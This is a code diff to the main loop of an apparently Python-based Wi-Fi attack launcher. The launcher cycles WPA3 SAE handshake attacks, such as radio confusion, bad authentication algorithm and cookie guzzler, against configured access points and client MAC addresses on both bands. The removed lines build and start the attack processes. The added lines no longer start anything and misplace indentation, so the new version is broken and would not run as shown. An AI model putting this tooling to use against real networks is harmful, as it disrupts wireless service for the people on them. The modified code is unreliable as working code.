@@ -756,72 +756,41 @@ def main():
     print(f"\n[INFO] Starting {len(ADAPTER_KONFIGURATION)} attack processes...")
     print("Press Ctrl+C to stop.\n")
     
-    try:
-        while True:
-            with channel_lock:
-                ap_targets['5ghz']['channel'] = shared_channels.get('5GHz', MANUELLER_KANAL_5GHZ)
-                ap_targets['2.4ghz']['channel'] = shared_channels.get('2.4GHz', MANUELLER_KANAL_2_4GHZ)
-
-            for iface, cfg in ADAPTER_KONFIGURATION.items():
-                attack, band = cfg['angriff'], cfg.get('band','5GHz')
-                if attack not in ATTACKS: continue
-                ap = ap_targets.get('5ghz' if band=='5GHz' else '2.4ghz')
-                if not ap: continue
-                
-                restart_needed = False
-                if iface not in procs or not procs[iface].is_alive():
-                    restart_needed = True
-                elif active_channels.get(iface) != ap['channel']:
-                    restart_needed = True 
-                
-                if restart_needed:
-                    if restart_counters[iface] >= MAX_RESTARTS:
-                        continue
-                    
-                    if iface in procs and procs[iface].is_alive():
-                        procs[iface].terminate()
-                        procs[iface].join(timeout=0.5)
-                        if procs[iface].is_alive(): procs[iface].kill()
-                    
-                    if attack in["case6_radio_confusion","case13_radio_confusion_mediatek_reverse"]:
-                        s_list, f_list = SAE_SCALAR_5_HEX_LIST, SAE_FINITE_5_HEX_LIST
-                    elif attack in ["case6_radio_confusion_reverse","case13_radio_confusion_mediatek"]:
-                        s_list, f_list = SAE_SCALAR_2_4_HEX_LIST, SAE_FINITE_2_4_HEX_LIST
-                    else:
-                        s_list = SAE_SCALAR_5_HEX_LIST if band=='5GHz' else SAE_SCALAR_2_4_HEX_LIST
-                        f_list = SAE_FINITE_5_HEX_LIST if band=='5GHz' else SAE_FINITE_2_4_HEX_LIST
-                    
-                    kw = {'bssid':ap['bssid'],'channel':ap['channel'],
-                          'scalar_hex_list':s_list,'finite_hex_list':f_list,'clients':[]}
-                    kw['bssid_5ghz'], kw['channel_5ghz'] = ap_targets['5ghz']['bssid'], ap_targets['5ghz']['channel']
-                    kw['bssid_2_4ghz'], kw['channel_2_4ghz'] = ap_targets['2.4ghz']['bssid'], ap_targets['2.4ghz']['channel']
-                    
-                    if attack in["case6_radio_confusion","case13_radio_confusion_mediatek_reverse"]:
-                        kw['clients'] = TARGET_STA_MACS_5GHZ_SPECIAL
-                    elif attack in["case6_radio_confusion_reverse","case13_radio_confusion_mediatek"]:
-                        kw['clients'] = TARGET_STA_MACS_2_4GHZ_SPECIAL
-                    elif attack not in["case2_bad_auth_algo_broadcom","bad_algo","bad_seq","bad_status_code","empty_frame_confirm","cookie_guzzler","case7_back_to_the_future"]:
-                        kw['clients'] = TARGET_STA_MACS
-                        
-                    if not kw['clients'] and attack not in["case2_bad_auth_algo_broadcom","bad_algo","bad_seq","bad_status_code","empty_frame_confirm","cookie_guzzler","case7_back_to_the_future"]:
-                        kw['clients'] =[str(RandMAC()) for _ in range(3)]
-                        print(f"[WARN] {iface}: No clients available, using random MACs.")
-                    
-                    p = Process(target=ATTACKS[attack], args=(iface,counters[iface]), kwargs=kw)
-                    p.start()
-                    procs[iface] = p
-                    active_channels[iface] = ap['channel']
-                    restart_counters[iface] += 1
-                    print(f"[START] {iface} ({band}): {attack} | Restart {restart_counters[iface]}/{MAX_RESTARTS}")
+try:
+    while True:
+        with channel_lock:
+            ap_targets['5ghz']['channel'] = shared_channels.get('5GHz', MANUELLER_KANAL_5GHZ)
+            ap_targets['2.4ghz']['channel'] = shared_channels.get('2.4GHz', MANUELLER_KANAL_2_4GHZ)
+        
+        for iface, cfg in ADAPTER_KONFIGURATION.items():
+            attack, band = cfg['angriff'], cfg.get('band', '5GHz')
+            if attack not in ATTACKS: continue
             
-            elapsed = time.time()
-            status = " | ".join([f"{i}:{counters[i].value}pkts" for i in procs])
-            sys.stdout.write(f"\r[MONITOR] {elapsed:.1f}s | {status}"); sys.stdout.flush(); time.sleep(0.5)
+            ap = ap_targets.get('5ghz' if band=='5GHz' else '2.4ghz')
+            if not ap: continue
             
-    except KeyboardInterrupt: 
-        print("\n[INFO] Stopped by user.")
-    finally: 
-        cleanup(procs)
+            restart_needed = False
+            
+            if iface not in procs or not procs[iface].is_alive():
+                restart_needed = True
+            elif active_channels.get(iface) != ap['channel']:
+                restart_needed = True
+            
+            if restart_needed:
+                
+                active_channels[iface] = ap['channel']
+                print(f"[START] {iface} ({band}): {attack} on CH {ap['channel']}")
+        
+        elapsed = time.time()
+        status = " | ".join([f"{i}:{counters[i].value}pkts" for i in procs])
+        sys.stdout.write(f"\r[MONITOR] {elapsed:.1f}s | {status}")
+        sys.stdout.flush()
+        time.sleep(0.5)
+        
+except KeyboardInterrupt:
+    print("\n[INFO] Stopped by user.")
+finally:
+    cleanup(procs)
         if scanner_proc and scanner_proc.is_alive():
             scanner_proc.terminate()
             scanner_proc.join()
